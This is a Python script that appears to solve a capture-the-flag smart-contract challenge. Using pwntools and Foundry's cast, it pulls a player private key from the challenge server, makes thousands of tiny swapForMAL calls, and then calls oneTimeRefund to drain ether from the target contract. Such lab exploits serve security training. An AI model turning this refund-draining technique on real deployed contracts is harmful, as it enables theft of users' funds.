#!/usr/bin/env python

from pwn import *
import subprocess


context.log_level = 'error'

GIVEN_RPC = "94.237.50.40:42634"
GIVEN_TCP = "94.237.50.40:47554"

RPC_URL = f"http://{GIVEN_RPC}/"

TCP_IP   = GIVEN_TCP.split(":")[0]
TCP_PORT = int(GIVEN_TCP.split(":")[1])




def init():
    p = remote(TCP_IP, TCP_PORT)

    p.sendline(b"1")
    p.recvuntil(b"Retrieving connection informations...\n\n")
    data = p.recvall().decode().split("\n")

    global PRIV_KEY
    global PLAYER_ADDR
    global TARGET_ADDR
    global SETUP_ADDR

    PRIV_KEY    = data[0].split(": ")[1]
    PLAYER_ADDR = data[1].split(": ")[1]
    TARGET_ADDR = data[2].split(": ")[1]
    SETUP_ADDR  = data[3].split(": ")[1]


def get_flag():
    p = remote(TCP_IP, TCP_PORT)

    p.sendline(b"3")
    p.recvuntil(b": ")
    print(p.recvall().decode())


def reset():
    p = remote(TCP_IP, TCP_PORT)

    p.sendline(b"2")
    p.recvuntil(b": ")
    print(p.recvall().decode())

def get_balance(player_addr):
    print(subprocess.check_output(["cast", "balance", "--rpc-url", RPC_URL, player_addr], text=True))

def swap_for_mal(amount):
    print(subprocess.check_output(["cast", "send", TARGET_ADDR, "swapForMAL()", "--value", str(amount)+"ether", "--rpc-url", RPC_URL, "--private-key", PRIV_KEY], text=True))

def get_mal_addr():
    return subprocess.check_output(["cast", "call", TARGET_ADDR, "malakarEssence()", "--rpc-url", RPC_URL], text=True).replace("000000000000000000000000", "").strip()

def get_mal_balance():
    print(subprocess.check_output(["cast", "call", MAL_ADDR, "balanceOf(address)", PLAYER_ADDR, "--rpc-url", RPC_URL], text=True))

def one_time_refund(amount):
    # print(" ".join(["cast", "send", TARGET_ADDR, "oneTimeRefund(address,uint256)", MAL_ADDR, str(amount), "--rpc-url", RPC_URL, "--private-key", PRIV_KEY]))
    print(subprocess.check_output(["cast", "send", TARGET_ADDR, "oneTimeRefund(address,uint256)", MAL_ADDR, str(amount), "--rpc-url", RPC_URL, "--private-key", PRIV_KEY], text=True))
    # cast send $TARGET_ADDRESS "oneTimeRefund(address,uint256)" $MAL_A 1 --rpc-url $RPC_URL --private-key $PRIVATE_KEY

def approve(amount):
    print(subprocess.check_output(["cast", "send", MAL_ADDR, "approve(address,uint256)", TARGET_ADDR, str(amount), "--rpc-url", RPC_URL, "--private-key", PRIV_KEY], text=True))
    # cast send $MAL_A "approve(address,uint256)" $TARGET_ADDRESS 1 --rpc-url $RPC_URL --private-key $PRIVATE_KEY





## ----------------------------------------
##               Playground
## ----------------------------------------
reset()

init()

MAL_ADDR = get_mal_addr()

# get_balance(PLAYER_ADDR)
for _ in range(10_000):
   swap_for_mal(0.001)
swap_for_mal(0.00000000000000001)
get_balance(PLAYER_ADDR)
get_mal_balance()

approve(1)
one_time_refund(1)

get_balance(PLAYER_ADDR)



# get_flag()
